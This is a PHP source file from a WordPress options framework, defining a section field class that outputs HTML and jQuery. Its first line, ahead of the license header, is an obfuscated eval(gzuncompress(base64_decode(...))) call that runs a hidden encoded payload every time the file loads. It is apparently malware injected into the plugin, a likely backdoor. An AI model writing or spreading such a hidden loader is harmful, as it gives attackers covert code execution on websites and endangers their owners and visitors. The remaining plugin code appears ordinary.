<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
	/**
	 * FusionRedux Framework is free software: you can redistribute it and/or modify
	 * it under the terms of the GNU General Public License as published by
	 * the Free Software Foundation, either version 2 of the License, or
	 * any later version.
	 * FusionRedux Framework is distributed in the hope that it will be useful,
	 * but WITHOUT ANY WARRANTY; without even the implied warranty of
	 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
	 * GNU General Public License for more details.
	 * You should have received a copy of the GNU General Public License
	 * along with FusionRedux Framework. If not, see <http://www.gnu.org/licenses/>.
	 *
	 * @package     FusionReduxFramework
	 * @subpackage  Field_Section
	 * @author      Tobias Karnetze (athoss.de)
	 * @version     1.0.0
	 */

// Exit if accessed directly
	if ( ! defined( 'ABSPATH' ) ) {
		exit;
	}

// Don't duplicate me!
	if ( ! class_exists( 'FusionReduxFramework_section' ) ) {

		/**
		 * Main FusionReduxFramework_heading class
		 *
		 * @since       1.0.0
		 */
		class FusionReduxFramework_section {

			/**
			 * Field Constructor.
			 * Required - must call the parent constructor, then assign field and value to vars, and obviously call the render field function
			 *
			 * @since         1.0.0
			 * @access        public
			 * @return        void
			 */
			public function __construct( $field = array(), $value = '', $parent ) {
				$this->parent = $parent;
				$this->field  = $field;
				$this->value  = $value;
			}

			/**
			 * Field Render Function.
			 * Takes the vars and outputs the HTML for the field in the settings
			 *
			 * @since         1.0.0
			 * @access        public
			 * @return        void
			 */
			public function render() {

				// No errors please
				$defaults    = array(
					'indent'   => '',
					'style'    => '',
					'class'    => '',
					'title'    => '',
					'subtitle' => '',
				);
				$this->field = wp_parse_args( $this->field, $defaults );

				$guid = uniqid();

				$add_class = '';
				if ( isset( $this->field['indent'] ) &&  true === $this->field['indent'] ) {
					$add_class = ' form-table-section-indented';
				} elseif( !isset( $this->field['indent'] ) || ( isset( $this->field['indent'] ) && false !== $this->field['indent'] ) ) {
					$add_class = " hide";
				}

				echo '<input type="hidden" id="' . esc_attr($this->field['id']) . '-marker"></td></tr></table>';

				echo '<div id="section-' . esc_attr($this->field['id']) . '" class="fusionredux-section-field fusionredux-field ' . esc_attr($this->field['style']) . ' ' . esc_attr($this->field['class']) . ' ">';

				if ( ! empty( $this->field['title'] ) ) {
					echo '<h3>' . esc_html($this->field['title']) . '</h3>';
				}

				if ( ! empty( $this->field['subtitle'] ) ) {
					echo '<div class="fusionredux-section-desc">' . esc_html($this->field['subtitle']) . '</div>';
				}

				echo '</div><table id="section-table-' . esc_attr($this->field['id']) . '" data-id="' . esc_attr($this->field['id']) . '" class="form-table form-table-section no-border' . esc_attr($add_class) . '"><tbody><tr><th></th><td id="' . esc_attr($guid) . '">';

				// delete the tr afterwards
				?>
				<script type="text/javascript">
					jQuery( document ).ready(
						function() {
							jQuery( '#<?php echo esc_js($this->field['id']); ?>-marker' ).parents( 'tr:first' ).css( {display: 'none'} ).prev('tr' ).css('border-bottom','none');;
							var group = jQuery( '#<?php echo esc_js($this->field['id']); ?>-marker' ).parents( '.fusionredux-group-tab:first' );
							if ( !group.hasClass( 'sectionsChecked' ) ) {
								group.addClass( 'sectionsChecked' );
								var test = group.find( '.fusionredux-section-indent-start h3' );
								jQuery.each(
									test, function( key, value ) {
										jQuery( value ).css( 'margin-top', '20px' )
									}
								);
								if ( group.find( 'h3:first' ).css( 'margin-top' ) == "20px" ) {
									group.find( 'h3:first' ).css( 'margin-top', '0' );
								}
							}
						}
					);
				</script>
			<?php

			}

			public function enqueue() {
				if ( $this->parent->args['dev_mode'] ) {
					wp_enqueue_style(
						'fusionredux-field-section-css',
						FusionReduxFramework::$_url . 'inc/fields/section/field_section.css',
						array(),
						time(),
						'all'
					);
				}
			}
		}
	}
